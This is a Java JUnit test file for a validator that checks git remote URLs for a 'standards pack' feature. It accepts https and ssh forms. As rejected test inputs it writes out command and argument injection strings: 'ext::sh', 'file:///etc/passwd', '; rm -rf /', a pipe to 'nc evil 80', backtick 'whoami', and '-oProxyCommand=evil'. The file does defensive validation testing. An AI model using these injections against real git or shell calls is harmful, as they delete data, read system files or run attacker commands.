package com.acltabontabon.launchpad.standards;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;

class RemoteStandardsUrlValidatorTest {

    @Test
    void blankInputIsAccepted() {
        assertThat(RemoteStandardsUrlValidator.validate(null)).isNull();
        assertThat(RemoteStandardsUrlValidator.validate("")).isNull();
        assertThat(RemoteStandardsUrlValidator.validate("   ")).isNull();
    }

    @Test
    void httpsUrlsAreAccepted() {
        assertThat(RemoteStandardsUrlValidator.validate("https://github.com/acme/standards.git")).isNull();
        assertThat(RemoteStandardsUrlValidator.validate("https://git.example.com:8443/team/pack")).isNull();
    }

    @Test
    void scpStyleAndSshAreAccepted() {
        assertThat(RemoteStandardsUrlValidator.validate("git@github.com:acme/standards.git")).isNull();
        assertThat(RemoteStandardsUrlValidator.validate("ssh://git@github.com/acme/standards.git")).isNull();
    }

    @Test
    void extSchemeIsRejected() {
        assertThat(RemoteStandardsUrlValidator.validate("ext::sh"))
            .contains("scheme is not allowed");
    }

    @Test
    void fileSchemeIsRejected() {
        assertThat(RemoteStandardsUrlValidator.validate("file:///etc/passwd"))
            .contains("scheme is not allowed");
    }

    @Test
    void plainHttpIsRejected() {
        assertThat(RemoteStandardsUrlValidator.validate("http://example.com/pack.git"))
            .contains("scheme is not allowed");
    }

    @Test
    void shellMetacharactersAreRejected() {
        assertThat(RemoteStandardsUrlValidator.validate("https://example.com/pack.git; rm -rf /"))
            .contains("forbidden characters");
        assertThat(RemoteStandardsUrlValidator.validate("https://example.com/pack.git|nc evil 80"))
            .contains("forbidden characters");
        assertThat(RemoteStandardsUrlValidator.validate("https://example.com/`whoami`"))
            .contains("forbidden characters");
        assertThat(RemoteStandardsUrlValidator.validate("https://example.com/pack with spaces"))
            .contains("forbidden characters");
    }

    @Test
    void unrecognisedFormsAreRejected() {
        assertThat(RemoteStandardsUrlValidator.validate("not-a-url"))
            .contains("must be https://");
        assertThat(RemoteStandardsUrlValidator.validate("ftp://example.com/pack"))
            .contains("must be https://");
        assertThat(RemoteStandardsUrlValidator.validate("-oProxyCommand=evil"))
            .isNotNull();
    }

    @Test
    void overlongUrlsAreRejected() {
        var huge = "https://example.com/" + "a".repeat(RemoteStandardsUrlValidator.MAX_LENGTH);
        assertThat(RemoteStandardsUrlValidator.validate(huge)).contains("too long");
    }
}
